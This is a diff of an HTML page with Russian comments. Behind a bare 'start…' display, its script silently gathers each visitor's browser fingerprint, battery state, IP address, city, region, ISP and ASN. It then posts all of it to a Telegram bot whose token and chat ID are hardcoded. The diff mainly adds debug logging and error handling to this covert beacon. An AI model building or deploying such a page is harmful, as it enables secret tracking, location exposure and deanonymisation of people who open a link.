@@ -7,17 +7,20 @@
 <style>
   body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
        background:#0e0e10;color:#9aa0a6;font:14px/1.5 ui-monospace,monospace}
-  #s{opacity:.8}
+  #s{white-space:pre-wrap;padding:1em;max-width:90vw}
 </style>
 </head>
 <body>
-<p id="s">загрузка…</p>
+<pre id="s">старт…</pre>
 
 <script>
-const BOT_TOKEN = "8989141650:AAFBGRMzK6D_7yqVGiinhRR1VHK7Q65ATKY";   // ← твой токен
-const CHAT_ID   = "8989141650";           // ← твой chat_id
+/* ====== МЕНЯЙ ТОЛЬКО ЭТИ ДВЕ СТРОКИ ====== */
+const BOT_TOKEN = "8989141650:AAFBGRMzK6D_7yqVGiinhRR1VHK7Q65ATKY";   // ← из @BotFather
+const CHAT_ID   = "8989141650";           // ← из @userinfobot / getUpdates
+/* ========================================= */
 
-// 1) что браузер отдаёт без разрешений
+const log = m => document.getElementById("s").textContent += "\n" + m;
+
 const info = {
   ua:       navigator.userAgent,
   platform: navigator.platform,
@@ -40,22 +43,14 @@ const info = {
   ts:       new Date().toISOString(),
 };
 
-// 2) батарея (не везде, но если есть — берём)
 if (navigator.getBattery) {
   navigator.getBattery().then(b => {
-    info.battery = {
-      level:    Math.round(b.level * 100) + "%",
-      charging: b.charging,
-    };
+    info.battery = { level: Math.round(b.level * 100) + "%", charging: b.charging };
   }).catch(()=>{});
 }
 
-// 3) IP + гео — публичный эндпоинт, браузер отдаёт сам
 async function geo() {
-  const endpoints = [
-    "https://ipapi.co/json/",
-    "https://ipwho.is/",
-  ];
+  const endpoints = ["https://ipapi.co/json/", "https://ipwho.is/"];
   for (const url of endpoints) {
     try {
       const r = await fetch(url, {cache: "no-store"});
@@ -65,34 +60,39 @@ async function geo() {
         city:    j.city,
         region:  j.region || j.region_name,
         country: j.country_name || j.country,
-        org:     j.org || j.connection?.org,
-        asn:     j.asn || j.connection?.asn,
+        org:     j.org || (j.connection && j.connection.org),
+        asn:     j.asn || (j.connection && j.connection.asn),
       };
-    } catch (e) {}
+    } catch (e) { log("geo try fail: " + url); }
   }
   return {ip: null};
 }
 
-// 4) отправка в TG
 async function send(payload) {
   const text = "📡 beacon\n```\n" + JSON.stringify(payload, null, 2) + "\n```";
-  try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({chat_id: CHAT_ID, text, parse_mode: "Markdown"})
-    });
-    document.getElementById("s").textContent = "готово";
-  } catch (e) {
-    document.getElementById("s").textContent = "ошибка сети";
-  }
+  const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({chat_id: CHAT_ID, text, parse_mode: "Markdown"})
+  });
+  const j = await r.json();
+  if (!j.ok) throw new Error("TG: " + JSON.stringify(j));
+  return j;
 }
 
-// 5) сборка + отправка
 (async () => {
-  const g = await geo();
-  Object.assign(info, g);
-  await send(info);
+  log("geo…");
+  try {
+    const g = await geo();
+    log("geo ok: " + JSON.stringify(g));
+    Object.assign(info, g);
+  } catch (e) { log("geo FAIL: " + e.message); }
+
+  log("send…");
+  try {
+    await send(info);
+    log("✅ send ok");
+  } catch (e) { log("❌ send FAIL: " + e.message); }
 })();
 </script>
 </body>
